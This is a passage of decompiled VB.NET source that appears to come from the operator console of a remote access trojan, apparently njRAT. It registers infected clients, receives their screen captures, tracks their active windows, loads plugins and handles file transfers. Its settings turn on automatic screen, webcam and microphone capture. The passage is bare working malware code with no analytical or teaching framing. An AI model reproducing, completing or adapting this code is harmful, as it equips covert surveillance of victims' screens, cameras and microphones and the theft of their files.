                            If Operators.CompareString(strArray1(2).ToString(), "0", False) = 0 Then
                                client_0.plg.Add(strArray1(1))
                                Return
                            Else
                                Class7.smethod_2(client_0, Class7.smethod_0(DirectCast(Nothing, String), strArray1(1)), Conversions.ToBoolean(strArray1(2)))
                                Return
                            End If
                        ElseIf Operators.CompareString(Left1, "CAP", False) = 0 Then
                            Try
                                client_0.lastPC = DateAndTime.Now
                                client_0.Isend = False
                                Dim buffer As Byte() = DirectCast(NewLateBinding.LateIndexGet(DirectCast(Class6.smethod_9(byte_0_1, Class7.string_1), Object), New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())
                                If buffer.Length < 10 Then
                                    Return
                                End If
                                client_0.L.Cells(0).Value = DirectCast(Image.FromStream(DirectCast(New MemoryStream(buffer), Stream)), Object)
                                Return
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                                Return
                            End Try
                        Else
                            If Operators.CompareString(Left1, "act", False) <> 0 OrElse client_0.L Is Nothing OrElse Operators.CompareString(client_0.lastAC, strArray1(1), False) = 0 Then
                                Return
                            End If
                            client_0.lastAC = strArray1(1)
                            Dim collection As Collection = Class7.form1_0.S.Online
                            Monitor.Enter(DirectCast(collection, Object))
                            Try
                                client_0.L.Cells(Class7.int_11).Value = DirectCast(Class6.smethod_16(strArray1(1)), Object)
                                Return
                            Finally
                                Monitor.[Exit](DirectCast(collection, Object))
                            End Try
                        End If
                    End If
                End If
                Try
                    If client_0.L IsNot Nothing Then
                        Class7.form1_0.L1.method_9(client_0.L)
                    End If
                    Dim list As New List(Of Object)()
                    list.Add(DirectCast(My.Resources.JPEG, Object))
                    list.Add(DirectCast(Class6.smethod_16(strArray1(1)), Object))
                    list.Add(DirectCast(Strings.Split(client_0.ip(), ":", -1, CompareMethod.Binary)(0), Object))
                    Dim num1 As Integer = 2
                    Dim num2 As Integer = strArray1.Length - 2
                    Dim index1 As Integer = num1
                    While index1 <= num2
                        Dim num3 As Integer = index1 + 1
                        If num3 = Class7.int_11 - 1 Then
                            client_0.lastAC = strArray1(index1)
                            list.Add(DirectCast(Class6.smethod_16(strArray1(index1)), Object))
                        ElseIf num3 = Class7.int_5 Then
                            list.Add(DirectCast(client_0.COI, Object))
                            list.Add(DirectCast(client_0.CName, Object))
                        Else
                            list.Add(DirectCast(strArray1(index1), Object))
                        End If
                        index1 += 1

                    End While
                    client_0.Folder = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(list(Class7.int_2), DirectCast("_", Object)), list(Class7.int_3)), DirectCast("_", Object)), DirectCast(Strings.Split(Conversions.ToString(list(Class7.int_0)), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(list(Class7.int_0)), "_", -1, CompareMethod.Binary).Length - 1), Object)))
                    Dim str1 As String = "\/<>?*:|"""
                    Dim index2 As Integer = 0
                    Dim length As Integer = str1.Length
                    While index2 < length
                        Dim str2 As String = Conversions.ToString(str1(index2))
                        client_0.Folder = client_0.Folder.Replace(str2, "%" & Conversion.Hex(Strings.Asc(str2)))
                        index2 += 1

                    End While
                    client_0.Folder = (Application.StartupPath & "\nj_users\") + client_0.Folder & "\"
                    client_0.L = Class7.form1_0.L1.method_8(client_0.ip(), list.ToArray())
                    client_0.L.Tag = DirectCast(client_0, Object)
                    list.Clear()
                    client_0.plg.AddRange(DirectCast(Strings.Split(strArray1(strArray1.Length - 1), ",", -1, CompareMethod.Binary), IEnumerable(Of String)))
                Catch ex As Exception
                    ProjectData.SetProjectError(ex)
                    ProjectData.ClearProjectError()
                End Try
                If Class7.class8_0.bool_1 Then
                    Class7.form1_0.Pp1.WRT(New Object(8) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.DarkSlateBlue, Object), DirectCast(client_0.COI, Object), DirectCast(client_0.ip(), Object), DirectCast(Color.SteelBlue, Object), _
                        RuntimeHelpers.GetObjectValue(Class7.smethod_1(client_0.L)), DirectCast(Color.DarkBlue, Object), DirectCast("Ready", Object)})
                End If
                If Not Class7.class8_0.bool_0 Then
                    Return
                End If
                Class7.notf_0.AddItem(client_0.COI, String.Format(My.Resources.notf, New Object() {RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_2).Value), RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_3).Value), RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_7).Value), RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_6).Value), RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_9).Value), RuntimeHelpers.GetObjectValue(client_0.L.Cells.Item(Class7.int_0).Value), client_0.ip.Split(New Char() {":"c})(0)}))
            End If
        Catch ex1 As Exception
            ProjectData.SetProjectError(ex1)
            Dim exception As Exception = ex1
            If Operators.CompareString(strArray1(0), "up", False) = 0 Or Operators.CompareString(strArray1(0), "dw", False) = 0 Then
                Try
                    client_0.Send("close" & Class7.string_1 & strArray1(1))
                Catch ex2 As Exception
                    ProjectData.SetProjectError(ex2)
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            Else
                If Operators.CompareString(strArray1(0).ToLower(), "cap", False) = 0 Then
                    client_0.Isend = False
                End If
                If Class7.class8_0.bool_3 Then
                    Class7.form1_0.Pp1.WRT(New Object(9) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.BlueViolet, Object), DirectCast("Listner", Object), DirectCast(Color.DarkRed, Object), DirectCast("ERR AT ", Object), _
                        DirectCast(Color.White, Object), DirectCast(strArray1(0), Object), DirectCast(Color.Red, Object), DirectCast(exception.Message, Object)})
                End If
                ProjectData.ClearProjectError()
            End If
        End Try
    End Sub

    Public NotInheritable Class Class8
        Public bool_0 As Boolean
        Public bool_1 As Boolean
        Public bool_2 As Boolean
        Public bool_3 As Boolean
        Public bool_4 As Boolean
        Public bool_5 As Boolean
        Public bool_6 As Boolean
        Public string_0 As String
        Public bool_7 As Boolean
        Public int_0 As Integer
        Public bool_8 As Boolean
        Public int_1 As Integer
        Public int_2 As Integer

        Public Sub method_0()
            Me.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"))
            Me.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"))
            Me.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"))
            Me.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"))
            Me.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"))
            Me.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"))
            Me.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"))
            Me.string_0 = Class6.smethod_2("SCI", "5")
            Me.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"))
            Me.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"))
            Me.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"))
            Me.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"))
            Me.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"))
        End Sub

        Public Sub method_1()
            Class6.smethod_3("ShowAlert", Me.bool_0.ToString())
            Class6.smethod_3("LOGLOGIN", Me.bool_1.ToString())
            Class6.smethod_3("LOGCONNECTIONS", Me.bool_2.ToString())
            Class6.smethod_3("LOGLERR", Me.bool_3.ToString())
            Class6.smethod_3("LOGRERR", Me.bool_4.ToString())
            Class6.smethod_3("LOGMSGS", Me.bool_5.ToString())
            Class6.smethod_3("SCAUT", Me.bool_6.ToString())
            Class6.smethod_3("SCI", Me.string_0.ToString())
            Class6.smethod_3("CAMAUT", Me.bool_7.ToString())
            Class6.smethod_3("CAMI", Me.int_0.ToString())
            Class6.smethod_3("MICAUT", Me.bool_8.ToString())
            Class6.smethod_3("MICI", Me.int_1.ToString())
            Class6.smethod_3("scri", Me.int_2.ToString())
        End Sub
    End Class

    Public NotInheritable Class Class9
        Public byte_0 As Byte()
        Public string_0 As String
        Public string_1 As String

        Public Sub New(string_2 As String)
            Dim byte_0 As Byte() = File.ReadAllBytes(Application.StartupPath & "\plugin\" & string_2)
            Dim flag As Boolean = True

            Dim bool_0 As Boolean = flag
            Me.byte_0 = Class6.smethod_8(byte_0, bool_0)
            Me.string_0 = string_2
            Me.string_1 = Class6.smethod_5(Me.byte_0)
        End Sub
    End Class

    Public Delegate Sub Delegate0(object_0 As Object)
    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value
        Return value
    End Function
End Class
